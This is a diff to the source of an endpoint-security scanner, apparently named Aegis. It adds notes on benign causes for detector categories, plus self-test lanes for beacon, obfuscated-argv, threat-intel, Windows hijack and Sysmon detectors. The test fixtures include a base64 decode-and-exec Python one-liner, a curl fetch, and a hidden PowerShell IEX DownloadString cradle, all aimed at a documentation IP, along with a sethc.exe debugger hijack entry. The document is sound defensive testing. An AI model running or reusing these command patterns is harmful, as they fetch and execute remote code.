@@ -10244,10 +10244,27 @@ SENSOR_BENIGN_NOTES = {
                     "the flagged idiom (decode-and-exec) is what matters.",
     "net-listener": "Dev servers, Docker, syncthing, and AirPlay bind ports; "
                     "loopback-only listeners are already excluded.",
+    "net-beacon": "A long-lived sync/telemetry daemon you installed (syncthing, "
+                  "tailscaled, a backup agent) holds one endpoint across scans, "
+                  "which is the same SHAPE as a beacon — check the binary.",
     "btm": "Any app you install can register a login item or background agent.",
-    "browserext": "Extensions you installed yourself appear here on first sight.",
-    "ide_ext": "VSCode/Cursor extensions auto-update, which re-fires this.",
-    "wallet": "Wallet apps rewrite their own config on update or account change.",
+    # Keyed on the finding CATEGORY, which is hyphenated. The surface ids
+    # ("browserext", "ide_ext") are a different namespace, and using those
+    # spellings here meant _benign_note_for's exact lookup never matched, so
+    # these two notes silently never rendered on the surfaces that need them
+    # most.
+    "browser-ext": "Extensions you installed yourself appear here on first sight.",
+    "ide-ext": "VSCode/Cursor extensions auto-update, which re-fires this.",
+    "com-hijack": "Dev tools and Office add-ins register per-user COM servers "
+                  "under HKCU; a target inside Program Files is ordinary.",
+    "appinit": "A few legacy IME/accessibility tools still use AppInit_DLLs.",
+    "sysmon": "Your own scripting produces EID 1 constantly — the flagged argv "
+              "idiom is the signal, not the process itself.",
+    "intel": "A recent-window community feed can list a shared CDN/VPS address "
+             "someone else abused, so an ip:port hit is far weaker evidence "
+             "than a hash hit; verify before acting on the endpoint alone.",
+    "wallet-integrity": "Wallet apps rewrite their own config on update or "
+                        "account change.",
     "web-protection": "Editing /etc/hosts for local development is expected.",
     "hardening": "A deliberately disabled firewall or Remote Login you enabled.",
     "canary": "A backup/indexing tool touching the decoy file, or your own edit.",
@@ -14136,6 +14153,253 @@ def _assay_lanes():
             g["WRIT_FILE"] = real
             shutil.rmtree(d, ignore_errors=True)
 
+    # --- the surfaces added in this release --------------------------------
+    # Five detectors shipped with no control at all. That is the same state the
+    # latch detector was in when it answered "unknown" forever: reachable-
+    # looking, permanently silent, and nothing failing. The both-poles rule
+    # above applies unchanged to every lane below — the benign pole is named in
+    # each docstring, because on these five surfaces it is the harder one.
+
+    # Windows-shaped fixtures need Windows-shaped grading. Swapped for the
+    # duration of the two lanes below, UNCONDITIONALLY (including on Windows)
+    # so one control means the same thing on every host; the live tables keep
+    # their own lane (`risky-location`).
+    _WIN_ASSAY_FLAGS = {
+        "IS_WIN": True,
+        "TRUSTED_PREFIXES": ("C:\\Windows\\", "C:\\Program Files\\"),
+        "RISKY_PREFIXES": ("C:\\Users\\",),
+    }
+
+    def _swap_win_flags():
+        g = globals()
+        saved = {k: g[k] for k in _WIN_ASSAY_FLAGS}
+        g.update(_WIN_ASSAY_FLAGS)
+        return saved
+
+    def lane_beacon_recurrence(nonce):
+        """Recurrence scores the beacon residue shape and stays silent on
+        browser churn, a short history, a short span, and a signed binary in an
+        ordinary path.
+
+        The benign poles are the whole reason this detector exists as a
+        separate rung: outbound churn cannot be baseline-diffed because a
+        browser opens hundreds of connections, so recurrence keys on the
+        opposite invariant and MUST exclude the things that legitimately hold a
+        remote pair for hours. Pure over synthetic (ts, rows) snapshots — it
+        observes nothing, records nothing, and connects to nothing."""
+        now = _epoch()
+        hot = "/nonexistent-assay-%s/updater" % nonce
+        risky = os.path.join(WIN_TEMP if IS_WIN else "/tmp",
+                             "aegis-assay-%s" % nonce)
+        browser = "/nonexistent-assay-%s/Google Chrome" % nonce
+
+        def hist(row, spans=(4200, 2100, 60)):
+            return [(now - s, [list(row)]) for s in spans]
+
+        # Two hostile rows, one per arm of the gate: 'broken' is the single
+        # trust verdict suspicious_sig accepts on all three platforms, and the
+        # risky-path row proves the OR's other side with an ordinary signature.
+        for row in ((hot, "198.51.100.7", "8443", "broken"),
+                    (risky, "198.51.100.7", "8443", "signed")):
+            out = _beacon_recurrence(hist(row), [row])
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False
+        bro = (browser, "198.51.100.7", "8443", "broken")
+        if _beacon_recurrence(hist(bro), [bro]) != []:
+            return False            # a browser is excluded by NAME, not trust
+        row = (hot, "198.51.100.7", "8443", "broken")
+        if _beacon_recurrence(hist(row)[:2], [row]) != []:
+            return False            # below BEACON_MIN_SCANS
+        if _beacon_recurrence(hist(row, (600, 300, 60)), [row]) != []:
+            return False            # 3 scans, but inside one polling burst
+        quiet = ("/nonexistent-assay-%s/tool" % nonce, "198.51.100.7",
+                 "8443", "signed")
+        if _beacon_recurrence(hist(quiet), [quiet]) != []:
+            return False            # signed, ordinary path
+        return _beacon_recurrence(hist(row), []) == []   # not live now: silent
+
+    def lane_argv_obfuscation(nonce):
+        """An interpreter handed a long decodable high-entropy blob scores, an
+        inline decode-and-execute composition scores, a fetching argv escalates
+        — and the benign shapes stay silent.
+
+        Gate 1 (a real code-execution flag) is the benign pole that decides
+        whether this surface is usable at all: Electron helpers, JWT-bearing
+        cloud CLIs and hash-named cache paths carry giant opaque argv on an
+        ordinary machine, so entropy scored over any process would flag the
+        operator's own work. The stimulus is base64 of an INERT nonce-tagged
+        marker plus random bytes: it is built here rather than committed, and
+        it decodes to nothing that runs."""
+        raw = b"AEGIS-ASSAY-INERT-" + nonce.encode() + os.urandom(80)
+        blob = base64.b64encode(raw).decode()
+        hostile = ('python3 -c "import base64;exec(base64.b64decode(\'%s\'))"'
+                   % blob)
+        sig = dict(_argv_signals(hostile))
+        if "obfuscated-inline-payload" not in sig:
+            return False            # the long decodable blob itself
+        if "argv-encoded-loader" not in sig:
+            return False            # decode composed with an exec sink
+        fetchy = ('python3 -c "import os,base64;os.system(\'curl -fsSL '
+                  'http://198.51.100.7/%s\');exec(base64.b64decode(\'%s\'))"'
+                  % (nonce, blob))
+        if dict(_argv_signals(fetchy)).get(
+                "obfuscated-inline-payload") != "HIGH":
+            return False            # an argv that also FETCHES escalates
+        for benign in ('python3 -c "print(1+1)"',
+                       'python3 -c "x=\'%s\'"' % ("a" * 160),
+                       'python3 -c "print(\'%s\')"'
+                       % ("the gardener waters every single row of tomatoes "
+                          "before dusk and the neighbours complain again"),
+                       "/nonexistent-assay-%s/tool --token %s"
+                       % (nonce, blob)):
+            if _argv_signals(benign):
+                return False        # short code, low entropy, English, no gate
+        # Gate 1 asserted against the scorer directly: the same blob with no
+        # code-execution flag anywhere in argv must score nothing at all.
+        return _obfuscated_payload_signals("--token %s" % blob, set()) == []
+
+    def lane_intel_match(nonce):
+        """A hash and an ip:port on the local IOC sets grade CRITICAL; a
+        non-matching hash, a non-matching endpoint, and empty sets are silent.
+
+        Runs against SYNTHETIC in-memory sets, with `_intel_sets` redirected
+        for the duration. A control that read the operator's real feed files
+        would prove nothing on a machine that never ran `intel update` and
+        would silently come to depend on whatever a feed published that day —
+        so this lane reads no file and makes no request."""
+        g = globals()
+        real = g["_intel_sets"]
+        hit = hashlib.sha256(("aegis-assay-hit-" + nonce).encode()).hexdigest()
+        miss = hashlib.sha256(
+            ("aegis-assay-miss-" + nonce).encode()).hexdigest()
+        meta = {"feed": "assay", "family": "Assay.Inert",
+                "first_seen": "1970-01-01"}
+        try:
+            g["_intel_sets"] = lambda: ({hit: meta},
+                                        {"198.51.100.7:8443": meta})
+            label = "com.assay.%s" % nonce
+            snap = {label: {"program": "/nonexistent-assay-%s/x" % nonce,
+                            "sha256": hit, "label": label}}
+            out = check_intel(snap)
+            if len(out) != 1 or out[0]["severity"] != "CRITICAL":
+                return False        # a persistence record's own program hash
+            out = check_intel({}, [{
+                "sha256": hit, "category": "hotdir",
+                "path": "/nonexistent-assay-%s/d" % nonce}])
+            if len(out) != 1 or out[0]["severity"] != "CRITICAL":
+                return False        # a hash another sensor already carried
+            net = _intel_net_finding("/nonexistent-assay-%s/x" % nonce,
+                                     "198.51.100.7", 8443)
+            if not net or net["severity"] != "CRITICAL":
+                return False        # a live connection to a catalogued C2
+            if check_intel({label: {"program": "/p", "sha256": miss}}) != []:
+                return False        # a hash the sets do not carry
+            if _intel_net_finding("/p", "203.0.113.9", 443) is not None:
+                return False        # an endpoint the sets do not carry
+            g["_intel_sets"] = lambda: ({}, {})
+            return check_intel(snap) == []   # no local intel at all: inert
+        except Exception:
+            return False
+        finally:
+            g["_intel_sets"] = real
+
+    def lane_win_evasion(nonce):
+        """The three Windows execute-hijack diffs score their hostile shapes
+        and stay silent on ordinary churn — on EVERY host.
+
+        These diffs are pure over dicts, so gating the lane to Windows would
+        leave the author's macOS machine reporting coverage that was never once
+        exercised: exactly the asserted-rather-than-demonstrated state this
+        whole tier exists to expose. The benign poles are what keep the surface
+        readable — a COM registration into an admin-writable install tree is
+        ordinary app churn, and an entry already present at first sight is
+        adopted, not alerted."""
+        saved = _swap_win_flags()
+        try:
+            clsid = "{018D5C66-4533-4307-9B53-224DE2ED1FE6}\\InprocServer32"
+            bad = "C:\\Users\\assay\\AppData\\Roaming\\assay-%s.dll" % nonce
+            good = "C:\\Program Files\\Vendor\\assay-%s.dll" % nonce
+            out = diff_com_hijack({}, {clsid: bad})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # new CLSID server in a user-writable path
+            out = diff_com_hijack({clsid: good}, {clsid: bad})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # the same CLSID repointed in place
+            if diff_com_hijack({}, {clsid: good}) != []:
+                return False        # a Program Files target is app churn
+            if diff_com_hijack({clsid: bad}, {clsid: bad}) != []:
+                return False        # adopted and unchanged
+            dbg = "C:\\Users\\assay\\assay-%s.exe" % nonce
+            out = diff_ifeo({}, {"debugger:sethc.exe": dbg})
+            if len(out) != 1 or out[0]["severity"] != "CRITICAL":
+                return False        # accessibility binary = pre-auth backdoor
+            out = diff_ifeo({}, {"debugger:notepad.exe": dbg})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # an ordinary target is HIGH, not CRITICAL
+            if diff_ifeo({"debugger:sethc.exe": dbg},
+                         {"debugger:sethc.exe": dbg}) != []:
+                return False        # pre-existing entry, already adopted
+            ak = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
+            val = "assay-%s.dll" % nonce
+            out = diff_appinit({}, {ak: val})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # AppInit_DLLs is off by default
+            return diff_appinit({ak: val}, {ak: val}) == []
+        except Exception:
+            return False
+        finally:
+            globals().update(saved)
+
+    def lane_sysmon_scoring(nonce):
+        """Sysmon EID 1 and 6 scoring fires on the hostile fixtures and stays
+        silent on a validly-signed driver, a clean process in a trusted path,
+        and a stray event ID.
+
+        Pure over the `log|id|time|message` rows the harvest already parses, so
+        it runs everywhere for the same reason the lane above does. EID 1 is
+        the high-volume channel Sysmon exists to produce, so 'can it fire' is
+        the cheap half — a scorer that reported every process creation would
+        pass a hostile-only control and bury the operator."""
+        saved = _swap_win_flags()
+        try:
+            ch = _SYSMON_CHANNEL
+            cmd = ("powershell -nop -w hidden -c IEX(New-Object "
+                   "Net.WebClient).DownloadString('http://198.51.100.7/%s')"
+                   % nonce)
+            hostile = ("Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+                       "\\powershell.exe CommandLine: %s" % cmd)
+            out = _sysmon_findings([(ch, "1", "2026-01-01T00:00Z", hostile)])
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # hostile idiom in the CommandLine
+            drop = ("Image: C:\\Users\\assay\\AppData\\Local\\Temp\\assay-%s"
+                    ".exe CommandLine: assay-%s.exe --quiet" % (nonce, nonce))
+            out = _sysmon_findings([(ch, "1", "t", drop)])
+            if len(out) != 1 or out[0]["severity"] != "MEDIUM":
+                return False        # risky-path exec with a clean argv
+            unsigned = ("ImageLoaded: C:\\Windows\\System32\\drivers\\assay-%s"
+                        ".sys Signed: false SignatureStatus: Unavailable"
+                        % nonce)
+            out = _sysmon_findings([(ch, "6", "t", unsigned)])
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # ring-0 code with no vouching signature
+            clean = ("Image: C:\\Windows\\System32\\notepad.exe CommandLine: "
+                     "notepad.exe C:\\Windows\\assay-%s.txt" % nonce)
+            if _sysmon_findings([(ch, "1", "t", clean)]) != []:
+                return False        # signed-path binary, nothing in the argv
+            signed = ("ImageLoaded: C:\\Windows\\System32\\drivers\\vendor-%s"
+                      ".sys Signed: true SignatureStatus: Valid" % nonce)
+            if _sysmon_findings([(ch, "6", "t", signed)]) != []:
+                return False        # a validly-signed driver load is silent
+            if _sysmon_findings([(ch, "3", "t", hostile)]) != []:
+                return False        # a stray EID must not fabricate a finding
+            # One event re-read in overlapping windows is ONE finding.
+            return len(_sysmon_findings([(ch, "6", "t", unsigned),
+                                         (ch, "6", "t2", unsigned)])) == 1
+        except Exception:
+            return False
+        finally:
+            globals().update(saved)
+
     return [
         ("hostile-argv", "fetch-and-execute argv still scores hostile",
          lane_hostile_argv),
@@ -14155,6 +14419,21 @@ def _assay_lanes():
          lane_glean_atoms),
         ("writ-enforcement", "writ escalates uncovered, adopts covered, off is inert",
          lane_writ_enforcement),
+        ("beacon-recurrence",
+         "outbound recurrence fires on beacon shape, not on browser churn",
+         lane_beacon_recurrence),
+        ("argv-obfuscation",
+         "obfuscated inline payload scores; plain and unflagged argv do not",
+         lane_argv_obfuscation),
+        ("intel-match",
+         "an IOC-set hash/endpoint is CRITICAL, a miss stays silent",
+         lane_intel_match),
+        ("win-evasion",
+         "COM/IFEO/AppInit hijack diffs fire, ordinary churn does not",
+         lane_win_evasion),
+        ("sysmon-scoring",
+         "Sysmon EID1/6 scoring fires; signed-and-trusted stays silent",
+         lane_sysmon_scoring),
         ("hostile-content", "shell-content grammar still matches",
          lane_hostile_content),
         ("risky-location", "volatile exec dirs still rate as risky",
